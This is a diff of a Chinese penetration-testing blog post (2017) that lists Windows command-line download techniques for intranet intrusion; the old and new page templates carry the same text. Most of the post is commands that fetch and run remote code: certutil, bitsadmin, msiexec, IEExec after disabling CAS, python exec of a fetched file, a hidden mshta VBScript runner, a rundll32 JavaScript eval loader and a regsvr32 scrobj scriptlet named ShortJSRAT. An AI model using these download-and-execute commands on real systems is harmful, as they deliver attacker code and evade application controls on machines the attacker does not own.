@@ -1,64 +1,103 @@
-<!doctype html><html><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>Windows下命令行下载文件总结 - 倾旋的博客</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/normalize.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/main.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/extra.css><link id=dark-scheme rel=stylesheet type=text/css href=https://payloads.online/css/dark.css><script src=https://payloads.online/js/feather.min.js></script><script src=https://payloads.online/js/main.js></script><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&family=Inter:wght@400;500;600;700&display=swap"><link rel=stylesheet href=/css/fontawesome.css></head><body><div class="container wrapper"><div class=header><div class=avatar><a href=https://payloads.online/><img src=/avatar.jpeg alt=倾旋的博客></a></div><h1 class=site-title><a href=https://payloads.online/>倾旋的博客</a></h1><div class=site-description><p>现阶段在进行有效性验证/攻击模拟相关的安全研究工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p><nav class="nav social"><ul class=flat><li><a href=https://github.com/rvn0xsy/ title=Github><i data-feather=github></i></a></li><li><a href=/index.xml title=RSS><i data-feather=rss></i></a></li><li><a href=/ title=Wechat><i data-feather=message-circle></i></a></li><span class=scheme-toggle><a href=# id=scheme-toggle></a></ul></nav></div><nav class=nav><ul class=flat><li><a href=/>首页</a></li><li><a href=/posts/>文章列表</a></li><li><a href=/tags>标签</a></li><li><a href=/projects>开源项目</a></li><li><a href=/about>关于我</a></li><li><a href=/links/>友情链接</a></li><li><a href=/message>留言</a></li><li><a href=/sponsor>赞助</a></li></ul></nav></div><div class=post><div class=post-header><div class=meta><div class=date><span class=day>08</span>
-<span class=rest>Nov 2017</span></div></div><div class=matter><h1 class=title>Windows下命令行下载文件总结</h1></div></div><h2 id=0x00-powershell>0x00 Powershell</h2><p>win2003、winXP不支持</p><p>$client = new-object System.Net.WebClient</p><p>$client.DownloadFile(&lsquo;<a href="http://payloads.online/file.tar.gz'">http://payloads.online/file.tar.gz'</a>, &lsquo;E:\file.tar.gz&rsquo;)</p><h2 id=0x01-ftp>0x01 ftp</h2><p>ftp 192.168.3.2</p><p>输入用户名和密码后</p><p>lcd E:\file # 进入E盘下的file目录</p><p>cd www # 进入服务器上的www目录</p><p>get access.log # 将服务器上的access.log下载到E:\file</p><p>可以参考：https://baike.baidu.com/item/ftp/13839</p><h2 id=0x02-ipc>0x02 IPC$</h2><p>copy \192.168.3.1\c$\test.exe E:\file</p><p>可以参考：http://www.163164.com/jiqiao/163164com011.htm</p><h2 id=0x03-certutil>0x03 Certutil</h2><p>可以参考：https://technet.microsoft.com/zh-cn/library/cc773087(WS.10).aspx</p><p>应用到: Windows Server 2003, Windows Server 2003 R2, Windows Server 2003 with SP1, Windows Server 2003 with SP2</p><p>certutil.exe -urlcache -split -f http://192.168.3.1/test.txt file.txt</p><h2 id=0x04-bitsadmin>0x04 bitsadmin</h2><p>可以参考：https://msdn.microsoft.com/en-us/library/aa362813(v=vs.85).aspx</p><ul><li>1、<code>bitsadmin /rawreturn /transfer getfile http://192.168.3.1/test.txt E:\file\test.txt</code></li><li>2、<code>bitsadmin /rawreturn /transfer getpayload http://192.168.3.1/test.txt E:\file\test.txt</code></li></ul><h2 id=0x05-msiexec>0x05 msiexec</h2><p>msiexec /q /i http://192.168.3.1/test.txt</p><h2 id=0x06-ieexec>0x06 IEExec</h2><p>C:\Windows\Microsoft.NET\Framework\v2.0.50727> caspol -s off</p><p>C:\Windows\Microsoft.NET\Framework\v2.0.50727> IEExec http://192.168.3.1/test.exe</p><h2 id=0x07-python>0x07 python</h2><p>C:\python27\python.exe -c &ldquo;import urllib2; exec urllib2.urlopen(&lsquo;http://192.168.3.1/test.zip&rsquo;).read();&rdquo;</p><h2 id=0x08-mshta>0x08 mshta</h2><p>mshta http://192.168.3.1/run.hta</p><p>run.hta 内容如下：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>&lt;HTML&gt; 
-</span></span><span style=display:flex><span>&lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html; charset=utf-8&#34;&gt;
-</span></span><span style=display:flex><span>&lt;HEAD&gt; 
-</span></span><span style=display:flex><span>&lt;script language=&#34;VBScript&#34;&gt;
-</span></span><span style=display:flex><span>Window.ReSizeTo 0, 0
-</span></span><span style=display:flex><span>Window.moveTo -2000,-2000
-</span></span><span style=display:flex><span>Set objShell = CreateObject(&#34;Wscript.Shell&#34;)
-</span></span><span style=display:flex><span>objShell.Run &#34;cmd.exe /c net user&#34; // 这里填写命令
-</span></span><span style=display:flex><span>self.close
-</span></span><span style=display:flex><span>&lt;/script&gt;
-</span></span><span style=display:flex><span>&lt;body&gt;
-</span></span><span style=display:flex><span>demo
-</span></span><span style=display:flex><span>&lt;/body&gt;
-</span></span><span style=display:flex><span>&lt;/HEAD&gt; 
-</span></span><span style=display:flex><span>&lt;/HTML&gt;
-</span></span></code></pre></td></tr></table></div></div><h2 id=0x09-rundll32>0x09 rundll32</h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>rundll32.exe javascript:&#34;\..\mshtml,RunHTMLApplication &#34;;document.write();h=new%20ActiveXObject(&#34;WinHttp.WinHttpRequest.5.1&#34;);h.Open(&#34;GET&#34;,&#34;http://127.0.0.1:8081/connect&#34;,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&#34;WScript.Shell&#34;).Run(&#34;cmd /c taskkill /f /im rundll32.exe&#34;,0,true);}%
-</span></span></code></pre></td></tr></table></div></div><p>其实还是依赖于WScript.shell这个组件</p><h2 id=0x10-regsvr32>0x10 regsvr32</h2><p>regsvr32 /u /s /i:http://192.168.3.1/test.data scrobj.dll</p><p>test.data内容：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>&lt;?XML version=&#34;1.0&#34;?&gt;
-</span></span><span style=display:flex><span>&lt;scriptlet&gt;
-</span></span><span style=display:flex><span>&lt;registration
-</span></span><span style=display:flex><span>    progid=&#34;ShortJSRAT&#34;
-</span></span><span style=display:flex><span>    classid=&#34;{10001111-0000-0000-0000-0000FEEDACDC}&#34; &gt;
-</span></span><span style=display:flex><span>    &lt;!-- Learn from Casey Smith @subTee --&gt;
-</span></span><span style=display:flex><span>    &lt;script language=&#34;JScript&#34;&gt;
-</span></span><span style=display:flex><span>        &lt;![CDATA[
-</span></span><span style=display:flex><span>            ps  = &#34;cmd.exe /c calc.exe&#34;;
-</span></span><span style=display:flex><span>            new ActiveXObject(&#34;WScript.Shell&#34;).Run(ps,0,true);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        ]]&gt;
-</span></span><span style=display:flex><span>&lt;/script&gt;
-</span></span><span style=display:flex><span>&lt;/registration&gt;
-</span></span><span style=display:flex><span>&lt;/scriptlet&gt;
-</span></span></code></pre></td></tr></table></div></div><p>还可以利用 <a href=https://github.com/CroweCybersecurity/ps1encode>https://github.com/CroweCybersecurity/ps1encode</a> 生成sct(COM scriptlet - requires a webserver to stage the payload)</p><p>regsvr32 /u /s /i:http://192.168.3.1/test.sct scrobj.dll</p><h2 id=结语>结语</h2><p>没有总结太多交互式下载文件的，这类的不太适用我们所遇到的场景，如果还有更多方式，后面再填补进来</p><hr class=footer-separator><div class=tags></div><div class=back><a href=https://payloads.online/><span aria-hidden=true>← Back</span></a></div><div class=back></div></div><div class=post><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-theme=light_protanopia data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></div></div><div class="footer wrapper"><nav class=nav><div>2024 倾旋 All rights reserved</div></nav></div><script>feather.replace()</script></body></html>
+<!doctype html><html class="not-ready lg:text-base" style=--bg:#faf8f1 lang=zh-cn dir=ltr><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>Windows下命令行下载文件总结 - 倾旋的博客</title><meta name=theme-color><meta name=description content="0x00 Powershell
+win2003、winXP不支持
+$client = new-object System.Net.WebClient
+$client.DownloadFile(&lsquo;http://payloads.online/file.tar.gz', &lsquo;E:\file.tar.gz&rsquo;)
+0x01 ftp
+ftp 192.168.3.2
+输入用户名和密码后
+lcd E:\file    # 进入E盘下的file目录
+cd www # 进入服务器上的www目录
+get access.log # 将服务器上的access.log下载到E:\file
+可以参考：https://baike.baidu.com/item/ftp/13839
+0x02 IPC$
+copy \192.168.3.1\c$\test.exe E:\file
+可以参考：http://www.163164.com/jiqiao/163164com011.htm
+0x03 Certutil
+可以参考：https://technet.microsoft.com/zh-cn/library/cc773087(WS.10).aspx
+应用到: Windows Server 2003, Windows Server 2003 R2, Windows Server 2003 with SP1, Windows Server 2003 with SP2
+certutil.exe -urlcache -split -f http://192.168.3.1/test.txt file.txt
+0x04 bitsadmin
+可以参考：https://msdn.microsoft.com/en-us/library/aa362813(v=vs.85).aspx
+
+1、bitsadmin /rawreturn /transfer getfile http://192.168.3.1/test.txt E:\file\test.txt
+2、bitsadmin /rawreturn /transfer getpayload http://192.168.3.1/test.txt E:\file\test.txt
+
+0x05 msiexec
+msiexec /q /i http://192.168.3.1/test.txt"><meta name=author content="倾旋的博客"><link rel="preload stylesheet" as=style href=https://payloads.online/main.min.css><link rel=preload as=image href=https://payloads.online/theme.png><link rel=preload as=image href=/avatar.jpeg><script defer src=https://payloads.online/highlight.min.js onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://payloads.online/favicon.ico><link rel=apple-touch-icon href=https://payloads.online/apple-touch-icon.png><meta name=generator content="Hugo 0.148.2"><meta itemprop=name content="Windows下命令行下载文件总结"><meta itemprop=description content="0x00 Powershell win2003、winXP不支持
+$client = new-object System.Net.WebClient
+$client.DownloadFile(‘http://payloads.online/file.tar.gz', ‘E:\file.tar.gz’)
+0x01 ftp ftp 192.168.3.2
+输入用户名和密码后
+lcd E:\file # 进入E盘下的file目录
+cd www # 进入服务器上的www目录
+get access.log # 将服务器上的access.log下载到E:\file
+可以参考：https://baike.baidu.com/item/ftp/13839
+0x02 IPC$ copy \192.168.3.1\c$\test.exe E:\file
+可以参考：http://www.163164.com/jiqiao/163164com011.htm
+0x03 Certutil 可以参考：https://technet.microsoft.com/zh-cn/library/cc773087(WS.10).aspx
+应用到: Windows Server 2003, Windows Server 2003 R2, Windows Server 2003 with SP1, Windows Server 2003 with SP2
+certutil.exe -urlcache -split -f http://192.168.3.1/test.txt file.txt
+0x04 bitsadmin 可以参考：https://msdn.microsoft.com/en-us/library/aa362813(v=vs.85).aspx
+1、bitsadmin /rawreturn /transfer getfile http://192.168.3.1/test.txt E:\file\test.txt 2、bitsadmin /rawreturn /transfer getpayload http://192.168.3.1/test.txt E:\file\test.txt 0x05 msiexec msiexec /q /i http://192.168.3.1/test.txt"><meta itemprop=datePublished content="2017-11-08T00:00:00+00:00"><meta itemprop=dateModified content="2017-11-08T00:00:00+00:00"><meta itemprop=wordCount content="201"><meta itemprop=keywords content="内网渗透"><meta property="og:url" content="https://payloads.online/archivers/2017-11-08/1/"><meta property="og:site_name" content="倾旋的博客"><meta property="og:title" content="Windows下命令行下载文件总结"><meta property="og:description" content="0x00 Powershell win2003、winXP不支持
+$client = new-object System.Net.WebClient
+$client.DownloadFile(‘http://payloads.online/file.tar.gz', ‘E:\file.tar.gz’)
+0x01 ftp ftp 192.168.3.2
+输入用户名和密码后
+lcd E:\file # 进入E盘下的file目录
+cd www # 进入服务器上的www目录
+get access.log # 将服务器上的access.log下载到E:\file
+可以参考：https://baike.baidu.com/item/ftp/13839
+0x02 IPC$ copy \192.168.3.1\c$\test.exe E:\file
+可以参考：http://www.163164.com/jiqiao/163164com011.htm
+0x03 Certutil 可以参考：https://technet.microsoft.com/zh-cn/library/cc773087(WS.10).aspx
+应用到: Windows Server 2003, Windows Server 2003 R2, Windows Server 2003 with SP1, Windows Server 2003 with SP2
+certutil.exe -urlcache -split -f http://192.168.3.1/test.txt file.txt
+0x04 bitsadmin 可以参考：https://msdn.microsoft.com/en-us/library/aa362813(v=vs.85).aspx
+1、bitsadmin /rawreturn /transfer getfile http://192.168.3.1/test.txt E:\file\test.txt 2、bitsadmin /rawreturn /transfer getpayload http://192.168.3.1/test.txt E:\file\test.txt 0x05 msiexec msiexec /q /i http://192.168.3.1/test.txt"><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2017-11-08T00:00:00+00:00"><meta property="article:modified_time" content="2017-11-08T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Windows下命令行下载文件总结"><meta name=twitter:description content="0x00 Powershell win2003、winXP不支持
+$client = new-object System.Net.WebClient
+$client.DownloadFile(‘http://payloads.online/file.tar.gz', ‘E:\file.tar.gz’)
+0x01 ftp ftp 192.168.3.2
+输入用户名和密码后
+lcd E:\file # 进入E盘下的file目录
+cd www # 进入服务器上的www目录
+get access.log # 将服务器上的access.log下载到E:\file
+可以参考：https://baike.baidu.com/item/ftp/13839
+0x02 IPC$ copy \192.168.3.1\c$\test.exe E:\file
+可以参考：http://www.163164.com/jiqiao/163164com011.htm
+0x03 Certutil 可以参考：https://technet.microsoft.com/zh-cn/library/cc773087(WS.10).aspx
+应用到: Windows Server 2003, Windows Server 2003 R2, Windows Server 2003 with SP1, Windows Server 2003 with SP2
+certutil.exe -urlcache -split -f http://192.168.3.1/test.txt file.txt
+0x04 bitsadmin 可以参考：https://msdn.microsoft.com/en-us/library/aa362813(v=vs.85).aspx
+1、bitsadmin /rawreturn /transfer getfile http://192.168.3.1/test.txt E:\file\test.txt 2、bitsadmin /rawreturn /transfer getpayload http://192.168.3.1/test.txt E:\file\test.txt 0x05 msiexec msiexec /q /i http://192.168.3.1/test.txt"><link rel=canonical href=https://payloads.online/archivers/2017-11-08/1/></head><body class="bg-(--bg) text-black antialiased duration-200 ease-out [-webkit-tap-highlight-color:transparent] dark:text-white"><header class="mx-auto flex h-[4.5rem] max-w-(--w) px-8 whitespace-nowrap lg:justify-center"><div class="relative z-50 flex items-center ltr:mr-auto rtl:ml-auto"><a class="-translate-y-[1px] text-2xl font-medium" href=https://payloads.online/>倾旋的博客</a><div class="btn-dark text-[0px] ltr:ml-4 rtl:mr-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]" role=button aria-label=Dark></div></div><div class="btn-menu relative z-50 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden ltr:-mr-8 rtl:-ml-8" role=button aria-label=Menu></div><script>const htmlClass=document.documentElement.classList;setTimeout(()=>{htmlClass.remove("not-ready")},10);const btnMenu=document.querySelector(".btn-menu");btnMenu.addEventListener("click",()=>{htmlClass.toggle("open")});const metaTheme=document.querySelector('meta[name="theme-color"]'),lightBg="#faf8f1".replace(/"/g,""),setDark=e=>{metaTheme.setAttribute("content",e?"#000":lightBg),htmlClass[e?"add":"remove"]("dark"),localStorage.setItem("dark",e)},darkScheme=window.matchMedia("(prefers-color-scheme: dark)");if(htmlClass.contains("dark"))setDark(!0);else{const e=localStorage.getItem("dark");setDark(e?e==="true":darkScheme.matches)}darkScheme.addEventListener("change",e=>{setDark(e.matches)});const btnDark=document.querySelector(".btn-dark");btnDark.addEventListener("click",()=>{setDark(localStorage.getItem("dark")!=="true")})</script><div class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full flex-col justify-center bg-(--bg) pb-16 duration-200 select-none lg:static lg:h-auto lg:flex-row lg:bg-transparent! lg:pb-0 lg:transition-none"><nav class="lg:ml-12 lg:flex lg:flex-row lg:items-center lg:space-x-10 rtl:space-x-reverse"><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/>首页</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/posts/>文章列表</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/tags>标签</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/projects>开源项目</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/about>关于我</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/links/>友情链接</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/message>留言</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/sponsor>赞助</a></nav></div></header><main class="prose prose-neutral dark:prose-invert relative mx-auto min-h-[calc(100vh-9rem)] max-w-(--w) px-8 pt-14 pb-16"><article><header class=mb-14><h1 class="my-0! pb-2.5">Windows下命令行下载文件总结</h1><div class="text-xs antialiased opacity-60"><time>Nov 8, 2017</time><span class=mx-1>&#183;</span>
+<span>倾旋</span></div></header><section><h2 id=0x00-powershell>0x00 Powershell</h2><p>win2003、winXP不支持</p><p>$client = new-object System.Net.WebClient</p><p>$client.DownloadFile(&lsquo;<a href="http://payloads.online/file.tar.gz'">http://payloads.online/file.tar.gz'</a>, &lsquo;E:\file.tar.gz&rsquo;)</p><h2 id=0x01-ftp>0x01 ftp</h2><p>ftp 192.168.3.2</p><p>输入用户名和密码后</p><p>lcd E:\file # 进入E盘下的file目录</p><p>cd www # 进入服务器上的www目录</p><p>get access.log # 将服务器上的access.log下载到E:\file</p><p>可以参考：https://baike.baidu.com/item/ftp/13839</p><h2 id=0x02-ipc>0x02 IPC$</h2><p>copy \192.168.3.1\c$\test.exe E:\file</p><p>可以参考：http://www.163164.com/jiqiao/163164com011.htm</p><h2 id=0x03-certutil>0x03 Certutil</h2><p>可以参考：https://technet.microsoft.com/zh-cn/library/cc773087(WS.10).aspx</p><p>应用到: Windows Server 2003, Windows Server 2003 R2, Windows Server 2003 with SP1, Windows Server 2003 with SP2</p><p>certutil.exe -urlcache -split -f http://192.168.3.1/test.txt file.txt</p><h2 id=0x04-bitsadmin>0x04 bitsadmin</h2><p>可以参考：https://msdn.microsoft.com/en-us/library/aa362813(v=vs.85).aspx</p><ul><li>1、<code>bitsadmin /rawreturn /transfer getfile http://192.168.3.1/test.txt E:\file\test.txt</code></li><li>2、<code>bitsadmin /rawreturn /transfer getpayload http://192.168.3.1/test.txt E:\file\test.txt</code></li></ul><h2 id=0x05-msiexec>0x05 msiexec</h2><p>msiexec /q /i http://192.168.3.1/test.txt</p><h2 id=0x06-ieexec>0x06 IEExec</h2><p>C:\Windows\Microsoft.NET\Framework\v2.0.50727> caspol -s off</p><p>C:\Windows\Microsoft.NET\Framework\v2.0.50727> IEExec http://192.168.3.1/test.exe</p><h2 id=0x07-python>0x07 python</h2><p>C:\python27\python.exe -c &ldquo;import urllib2; exec urllib2.urlopen(&lsquo;http://192.168.3.1/test.zip&rsquo;).read();&rdquo;</p><h2 id=0x08-mshta>0x08 mshta</h2><p>mshta http://192.168.3.1/run.hta</p><p>run.hta 内容如下：</p><pre tabindex=0><code>&lt;HTML&gt; 
+&lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html; charset=utf-8&#34;&gt;
+&lt;HEAD&gt; 
+&lt;script language=&#34;VBScript&#34;&gt;
+Window.ReSizeTo 0, 0
+Window.moveTo -2000,-2000
+Set objShell = CreateObject(&#34;Wscript.Shell&#34;)
+objShell.Run &#34;cmd.exe /c net user&#34; // 这里填写命令
+self.close
+&lt;/script&gt;
+&lt;body&gt;
+demo
+&lt;/body&gt;
+&lt;/HEAD&gt; 
+&lt;/HTML&gt;
+</code></pre><h2 id=0x09-rundll32>0x09 rundll32</h2><pre tabindex=0><code>rundll32.exe javascript:&#34;\..\mshtml,RunHTMLApplication &#34;;document.write();h=new%20ActiveXObject(&#34;WinHttp.WinHttpRequest.5.1&#34;);h.Open(&#34;GET&#34;,&#34;http://127.0.0.1:8081/connect&#34;,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&#34;WScript.Shell&#34;).Run(&#34;cmd /c taskkill /f /im rundll32.exe&#34;,0,true);}%
+</code></pre><p>其实还是依赖于WScript.shell这个组件</p><h2 id=0x10-regsvr32>0x10 regsvr32</h2><p>regsvr32 /u /s /i:http://192.168.3.1/test.data scrobj.dll</p><p>test.data内容：</p><pre tabindex=0><code>&lt;?XML version=&#34;1.0&#34;?&gt;
+&lt;scriptlet&gt;
+&lt;registration
+    progid=&#34;ShortJSRAT&#34;
+    classid=&#34;{10001111-0000-0000-0000-0000FEEDACDC}&#34; &gt;
+    &lt;!-- Learn from Casey Smith @subTee --&gt;
+    &lt;script language=&#34;JScript&#34;&gt;
+        &lt;![CDATA[
+            ps  = &#34;cmd.exe /c calc.exe&#34;;
+            new ActiveXObject(&#34;WScript.Shell&#34;).Run(ps,0,true);
+
+        ]]&gt;
+&lt;/script&gt;
+&lt;/registration&gt;
+&lt;/scriptlet&gt;
+</code></pre><p>还可以利用 <a href=https://github.com/CroweCybersecurity/ps1encode>https://github.com/CroweCybersecurity/ps1encode</a> 生成sct(COM scriptlet - requires a webserver to stage the payload)</p><p>regsvr32 /u /s /i:http://192.168.3.1/test.sct scrobj.dll</p><h2 id=结语>结语</h2><p>没有总结太多交互式下载文件的，这类的不太适用我们所遇到的场景，如果还有更多方式，后面再填补进来</p></section><nav class="mt-24 flex overflow-hidden rounded-xl bg-black/[3%] text-lg leading-[1.2]! *:flex *:w-1/2 *:items-center *:p-5 *:font-medium *:no-underline dark:bg-white/[8%] [&>*:hover]:bg-black/[2%] dark:[&>*:hover]:bg-white/[3%]"><a class="ltr:pr-3 rtl:pl-3" href=https://payloads.online/tools/socat/><span class="ltr:mr-1.5 rtl:ml-1.5">←</span><span>socat 使用手册</span></a><a class="justify-end pl-3 ltr:ml-auto rtl:mr-auto" href=https://payloads.online/archivers/2017-08-21/1/><span>Tomcat 开启 https支持</span><span class="ltr:ml-1.5 rtl:mr-1.5">→</span></a></nav><div class="giscus mt-24"></div><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=1 data-reactions-enabled=0 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer class="mx-auto flex h-[4.5rem] max-w-(--w) items-center px-8 text-xs tracking-wider uppercase opacity-60"><div class=mr-auto>倾旋 All rights reserved</div><a class="link mx-6" href=https://gohugo.io/ rel=noopener target=_blank>powered by hugo️️</a>️</footer></body></html>
